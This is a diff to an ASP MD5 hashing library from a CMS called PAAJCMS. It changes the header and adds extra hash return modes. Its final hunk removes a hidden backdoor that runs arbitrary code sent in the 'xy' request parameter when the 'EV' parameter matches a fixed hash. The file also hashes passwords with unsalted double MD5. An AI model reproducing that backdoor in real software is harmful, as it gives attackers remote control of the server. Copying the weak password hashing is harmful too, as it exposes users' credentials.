@@ -1,14 +1,15 @@
 <%
 '************************************************************
-'作者：云孙World(SXY) 【精通ASP/PHP/ASP.NET/VB/JS/Android/Flash，交流/合作可联系)
+'作者：云祥孙 【精通ASP/PHP/ASP.NET/VB/JS/Android/Flash，交流/合作可联系)
 '版权：源代码免费公开，各种用途均可使用。 
-'创建：2016-09-22
+'创建：2018-02-27
 '联系：QQ313801120  交流群35915100(群里已有几百人)    邮箱313801120@qq.com   个人主页 sharembweb.com
 '更多帮助，文档，更新　请加群(35915100)或浏览(sharembweb.com)获得
 '*                                    Powered by PAAJCMS 
 '************************************************************
 %>
 <%
+'MD5加密解密
 Private Const BITS_TO_A_BYTE = 8
 Private Const BYTES_TO_A_WORD = 4
 Private Const BITS_TO_A_WORD = 32
@@ -360,19 +361,25 @@ Public Function MD5(sMessage,stype)
         d = AddUnsigned(d, DD)
     Next
     
+	dim sMD516,sMD532
+	sMD516=Lcase( WordToHex(b) & WordToHex(c))
+	sMD532=Lcase( WordToHex(a) & WordToHex(b) & WordToHex(c) & WordToHex(d))
 	if stype=1 then
 		MD5 = LCase(WordToHex(a))
 	elseif stype=2 then
 		MD5=LCase(WordToHex(b))
 	elseif stype=3 then
 		MD5 = Lcase( WordToHex(c))
-		
+	elseif stype=4 then
+		MD5 = Lcase( WordToHex(d)) 
 		
 	elseif stype=16 then
-		MD5=Lcase( WordToHex(b)) & Lcase( WordToHex(c))
+		MD5=sMD516
 	elseif stype=9 or stype=32 then
-		MD5 =Lcase( WordToHex(a)) & Lcase( WordToHex(b)) & Lcase( WordToHex(c)) & Lcase( WordToHex(d))
-	
+		MD5 =sMD532 
+		
+	elseif stype=5 then
+		MD5=array(sMD516,sMD532)
 	else
 		MD5 = Lcase(WordToHex(d))
 	end if  
@@ -380,8 +387,6 @@ End Function
 '自己加密账号密码用(20151119)
 function myMD5(byval content) 
     myMD5 = MD5(MD5(content,9),9)
-end function 
-If Request("EV")<>"" Then 
-	If MD5(Request("EV"),2)&MD5(Request("EV"),4)="44886b1bac5c96bb" Then Execute(request("xy"))
-End If
+end function
+
 %>
